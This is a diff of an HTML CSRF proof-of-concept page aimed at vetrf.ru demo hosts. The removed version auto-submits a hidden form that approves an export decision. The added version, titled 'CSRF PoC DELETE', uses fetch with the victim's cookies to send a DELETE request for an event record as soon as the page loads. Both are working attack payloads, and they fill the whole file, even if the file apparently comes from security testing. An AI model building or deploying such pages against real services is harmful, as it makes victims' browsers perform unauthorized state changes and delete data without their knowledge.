@@ -1,24 +1,20 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://demo-argus.vetrf.ru/uvn/operatorui" method="POST" id="csrf-form">
-      <input type="hidden" name="cause" value="">
-      <input type="hidden" name="_action" value="viseExportDecision">
-      <input type="hidden" name="cancelAction" value="">
-      <input type="hidden" name="commonHSNumber" value="">
-      <input type="hidden" name="productTypePk" value="7">
-      <input type="hidden" name="type" value="Export">
-      <input type="hidden" name="documentPk" value="">
-      <input type="hidden" name="cargoPk" value="">
-      <input type="hidden" name="acPk" value="">
-      <input type="hidden" name="aucPk" value="">
-      <input type="hidden" name="requestPk" value="307720">
-      <input type="hidden" name="pk" value="307720">
-      <input type="hidden" name="version" value="1">
-      <input type="hidden" name="pageList" value="1">
-      <input type="hidden" name="cancelUrl" value="operatorui%3F_action%3DshowExportRequestForm%26requestPk%3D307712%26pageList%3D1">
-    </form>
-    <script>
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC DELETE</title>
+</head>
+<body>
+  <script>
+    // Автоматическая отправка DELETE-запроса с куками жертвы
+    fetch('https://demo-herriot.vetrf.ru/api/events/2024/00017', {
+      method: 'DELETE',
+      credentials: 'include',           // отправляем куки
+      headers: {
+        'X-Requested-With': 'XMLHttpRequest',
+        'Accept': 'application/json, text/plain, */*'
+      }
+    }).catch(() => {});
+  </script>
+</body>
 </html>
